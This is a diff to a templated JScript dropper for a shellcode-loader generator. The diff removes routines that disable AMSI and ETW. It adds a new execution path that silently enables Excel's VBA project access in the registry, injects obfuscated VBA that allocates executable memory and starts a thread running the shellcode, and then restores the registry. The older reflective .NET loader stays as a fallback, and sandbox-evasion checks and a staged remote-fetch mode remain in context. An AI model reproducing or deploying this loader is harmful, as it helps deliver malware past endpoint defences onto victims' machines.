@@ -1,30 +1,8 @@
-<?xml version="1.0" encoding="utf-8"?>
 <package>
 <job id="{{ v.job_id }}">
 <script language="JScript">
 <![CDATA[
 function {{ v.fn_build_str }}(a){var {{ v.jsc_lv_bs }}="";for(var {{ v.jsc_lv_bi }}=0;{{ v.jsc_lv_bi }}<a.length;{{ v.jsc_lv_bi }}++){{ v.jsc_lv_bs }}+=String.fromCharCode(a[{{ v.jsc_lv_bi }}]);return {{ v.jsc_lv_bs }};}
-
-function {{ v.fn_amsi }}() {
-    try {
-        var {{ v.jsc_lv_aa }}  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-        var {{ v.jsc_lv_at }} = {{ v.jsc_lv_aa }}.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
-        if ({{ v.jsc_lv_at }} !== null) {
-            {{ v.jsc_lv_at }}.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), (4|32)).SetValue(null, true);
-        }
-    } catch(e) {}
-}
-
-function {{ v.fn_etw }}() {
-    try {
-        var {{ v.jsc_lv_ea }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-        var {{ v.jsc_lv_et }} = {{ v.jsc_lv_ea }}.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
-        if ({{ v.jsc_lv_et }} !== null) {
-            var {{ v.jsc_lv_ef }} = {{ v.jsc_lv_et }}.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), (4|32));
-            if ({{ v.jsc_lv_ef }} !== null) {{ v.jsc_lv_ef }}.SetValue(null, 0);
-        }
-    } catch(e) {}
-}
 
 function {{ v.fn_sandbox }}() {
     try {
@@ -115,8 +93,6 @@ function {{ v.fn_exec }}() {
             if({{ v.jsc_lv_pp2 }}){var {{ v.jsc_lv_ps2 }}={{ v.jsc_lv_pp2 }}.GetValue(null,null);if({{ v.jsc_lv_ps2 }}){var {{ v.jsc_lv_cx2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps2 }},null);var {{ v.jsc_lv_cy2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps2 }},null);if({{ v.jsc_lv_cx }}==={{ v.jsc_lv_cx2 }}&&{{ v.jsc_lv_cy }}==={{ v.jsc_lv_cy2 }})WScript.Quit(0);}}}}
         } catch(e2) {}
     }
-    {{ v.fn_amsi }}();
-    {{ v.fn_etw }}();
     {%- if is_staged %}
     // Staged: XOR-decode URL/JWT/UA at runtime, fetch via MSXML2.ServerXMLHTTP
     // with Bearer auth, return raw shellcode bytes as int[] via VBArray.toArray().
@@ -140,12 +116,68 @@ function {{ v.fn_exec }}() {
     for (var {{ v.jsc_lv_ki }} = 0; {{ v.jsc_lv_ki }} < {{ v.jsc_lv_k }}.length; {{ v.jsc_lv_ki }}++) {{ v.jsc_lv_k }}[{{ v.jsc_lv_ki }}] ^= {{ key_tweak }};
     var {{ v.jsc_lv_sc }}  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.jsc_lv_k }});
     {%- endif %}
-    var {{ v.jsc_lv_loader }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-    var {{ v.jsc_lv_stub }}   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
-    var {{ v.jsc_lv_asm }}    = {{ v.jsc_lv_loader }}.Load({{ v.jsc_lv_stub }});
-    var {{ v.jsc_lv_t1 }}     = {{ v.jsc_lv_asm }}.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
-    var {{ v.jsc_lv_mi }}     = {{ v.jsc_lv_t1 }}.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
-    {{ v.jsc_lv_mi }}.Invoke(null, [{{ v.jsc_lv_sc }}]);
+    var jsc_lv_xl, jsc_lv_wb, jsc_lv_vbm, jsc_lv_vbcode;
+    var jsc_lv_wsh, jsc_lv_vers, jsc_lv_saved, jsc_lv_vi, jsc_lv_regbase, jsc_lv_regtail, jsc_lv_regdword;
+    try {
+        jsc_lv_wsh = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
+        jsc_lv_regbase = {{ v.fn_build_str }}([72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,79,102,102,105,99,101,92]);
+        jsc_lv_regtail = {{ v.fn_build_str }}([92,69,120,99,101,108,92,83,101,99,117,114,105,116,121,92,65,99,99,101,115,115,86,66,79,77]);
+        jsc_lv_regdword = {{ v.fn_build_str }}([82,69,71,95,68,87,79,82,68]);
+        jsc_lv_vers = ["16.0", "15.0", "14.0"];
+        jsc_lv_saved = {};
+        for (jsc_lv_vi = 0; jsc_lv_vi < jsc_lv_vers.length; jsc_lv_vi++) {
+            var _rk = jsc_lv_regbase + jsc_lv_vers[jsc_lv_vi] + jsc_lv_regtail;
+            try { jsc_lv_saved[jsc_lv_vers[jsc_lv_vi]] = jsc_lv_wsh.RegRead(_rk); }
+            catch(_rr) { jsc_lv_saved[jsc_lv_vers[jsc_lv_vi]] = -1; }
+            try { jsc_lv_wsh.RegWrite(_rk, 1, jsc_lv_regdword); } catch(_rw) {}
+        }
+    } catch(_tcerr) {}
+
+    try {
+        jsc_lv_xl = new ActiveXObject({{ v.fn_build_str }}([69,120,99,101,108,46,65,112,112,108,105,99,97,116,105,111,110]));
+        jsc_lv_xl.Visible = false;
+        jsc_lv_xl.DisplayAlerts = false;
+        jsc_lv_wb = jsc_lv_xl.Workbooks.Add();
+        jsc_lv_vbcode = {{ v.fn_build_str }}([
+            80,114,105,118,97,116,101,32,68,101,99,108,97,114,101,32,80,116,114,83,97,102,101,32,70,117,110,99,116,105,111,110,32,86,65,32,76,105,98,32,34,107,101,114,110,101,108,51,50,34,32,65,108,105,97,115,32,34,86,105,114,116,117,97,108,65,108,108,111,99,34,32,40,66,121,86,97,108,32,108,80,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,100,83,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,102,65,32,65,115,32,76,111,110,103,44,32,66,121,86,97,108,32,102,80,32,65,115,32,76,111,110,103,41,32,65,115,32,76,111,110,103,80,116,114,13,10,
+            80,114,105,118,97,116,101,32,68,101,99,108,97,114,101,32,80,116,114,83,97,102,101,32,83,117,98,32,67,77,32,76,105,98,32,34,107,101,114,110,101,108,51,50,34,32,65,108,105,97,115,32,34,82,116,108,77,111,118,101,77,101,109,111,114,121,34,32,40,68,101,115,116,32,65,115,32,65,110,121,44,32,83,114,99,32,65,115,32,65,110,121,44,32,66,121,86,97,108,32,76,32,65,115,32,76,111,110,103,80,116,114,41,13,10,
+            80,114,105,118,97,116,101,32,68,101,99,108,97,114,101,32,80,116,114,83,97,102,101,32,70,117,110,99,116,105,111,110,32,67,84,32,76,105,98,32,34,107,101,114,110,101,108,51,50,34,32,65,108,105,97,115,32,34,67,114,101,97,116,101,84,104,114,101,97,100,34,32,40,66,121,86,97,108,32,108,84,65,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,100,83,83,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,108,83,65,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,108,80,32,65,115,32,76,111,110,103,80,116,114,44,32,66,121,86,97,108,32,100,67,70,32,65,115,32,76,111,110,103,44,32,66,121,82,101,102,32,108,84,73,32,65,115,32,76,111,110,103,41,32,65,115,32,76,111,110,103,80,116,114,13,10,
+            83,117,98,32,82,117,110,77,101,40,115,99,40,41,32,65,115,32,66,121,116,101,41,13,10,
+            32,32,32,32,68,105,109,32,112,32,65,115,32,76,111,110,103,80,116,114,13,10,
+            32,32,32,32,112,32,61,32,86,65,40,48,44,32,85,66,111,117,110,100,40,115,99,41,32,43,32,49,44,32,38,72,51,48,48,48,44,32,38,72,52,48,41,13,10,
+            32,32,32,32,67,77,32,66,121,86,97,108,32,112,44,32,115,99,40,48,41,44,32,85,66,111,117,110,100,40,115,99,41,32,43,32,49,13,10,
+            32,32,32,32,67,84,32,48,44,32,48,44,32,112,44,32,48,44,32,48,44,32,48,13,10,
+            69,110,100,32,83,117,98
+        ]);
+        var jsc_lv_comp = jsc_lv_wb.VBProject.VBComponents.Add(1);
+        jsc_lv_comp.CodeModule.AddFromString(jsc_lv_vbcode);
+        jsc_lv_xl.Run(jsc_lv_comp.Name + "." + {{ v.fn_build_str }}([82,117,110,77,101]), ({{ v.jsc_lv_sc }}));
+        try { WScript.Sleep(60000); } catch(_sl) {}
+        try { jsc_lv_wb.Close(false); } catch(_cw) {}
+        try { jsc_lv_xl.Quit(); } catch(_qx) {}
+    } catch(_xerr) {
+        var {{ v.jsc_lv_loader }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
+        var {{ v.jsc_lv_stub }}   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
+        var {{ v.jsc_lv_asm }}    = {{ v.jsc_lv_loader }}.Load({{ v.jsc_lv_stub }});
+        var {{ v.jsc_lv_t1 }}     = {{ v.jsc_lv_asm }}.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
+        var {{ v.jsc_lv_mi }}     = {{ v.jsc_lv_t1 }}.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
+        {{ v.jsc_lv_mi }}.Invoke(null, [{{ v.jsc_lv_sc }}]);
+    }
+
+    try {
+        if (jsc_lv_wsh && jsc_lv_saved) {
+            for (jsc_lv_vi = 0; jsc_lv_vi < jsc_lv_vers.length; jsc_lv_vi++) {
+                var _rk2 = jsc_lv_regbase + jsc_lv_vers[jsc_lv_vi] + jsc_lv_regtail;
+                try {
+                    if (jsc_lv_saved[jsc_lv_vers[jsc_lv_vi]] === -1) {
+                        jsc_lv_wsh.RegDelete(_rk2);
+                    } else {
+                        jsc_lv_wsh.RegWrite(_rk2, jsc_lv_saved[jsc_lv_vers[jsc_lv_vi]], jsc_lv_regdword);
+                    }
+                } catch(_rr2) {}
+            }
+        }
+    } catch(_trerr) {}
 }
 
 {{ v.fn_exec }}();
